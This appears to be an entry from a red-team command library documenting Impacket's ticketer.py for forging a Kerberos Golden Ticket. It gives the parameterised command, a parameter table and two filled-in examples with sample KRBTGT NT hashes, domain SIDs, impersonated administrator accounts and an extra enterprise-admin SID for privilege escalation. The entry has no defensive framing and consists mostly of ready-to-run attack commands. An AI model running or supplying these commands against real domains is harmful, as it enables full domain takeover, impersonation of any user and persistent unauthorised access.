---
type: command
executor: bash
data: >-
  ./ticketer.py -nthash $_KRBTGT_NTHASH -domain-sid $_DOMAIN_SID -domain
  $_DOMAIN_NAME $_USERNAME -extra-sid $_ENTERPRISE_SID
output: null
created_at: '2023-04-06T03:56:04.790462+00:00'
updated_at: '2023-04-10T20:26:04.568133+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - golden-ticket
  - forgery
verified: true
validated: true
---

# impacket-ticketer-forge-golden-ticket

## Command

```bash
./ticketer.py -nthash $_KRBTGT_NTHASH -domain-sid $_DOMAIN_SID -domain $_DOMAIN_NAME $_USERNAME -extra-sid $_ENTERPRISE_SID
```

## Description

Forges a Golden Ticket using Impacket's ticketer.py by specifying the KRBTGT NTLM hash and domain details, creating a TGT for the specified user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-nthash` | NTLM hash of KRBTGT account | Yes |
| `$_KRBTGT_NTHASH` | The hash value (e.g., a577fcf16cfef780a2ceb343ec39a0d9) | Yes |
| `-domain-sid` | Domain SID (e.g., S-1-5-21-2972629792-1506071460-1188933728) | Yes |
| `$_DOMAIN_SID` | Full SID string | Yes |
| `-domain` | Target domain name (e.g., amity.local) | Yes |
| `$_DOMAIN_NAME` | Domain FQDN | Yes |
| `$_USERNAME` | User to impersonate (e.g., administrator) | Yes |
| `-extra-sid` | Enterprise SID for admin privileges (e.g., S-1-5-21-...-519) | Yes |
| `$_ENTERPRISE_SID` | SID for Domain Admins group | Yes |

## Examples

### Basic Usage

```bash
./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da
```

### Advanced Usage

```bash
./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519
```

## Expected Output

"Ticket created successfully" and saves to default kirbi file. Use ls to confirm file existence.

## Related

- [[procedures/Forge-and-Use-Golden-Ticket-on-Linux]]
- [[tools/Impacket]]
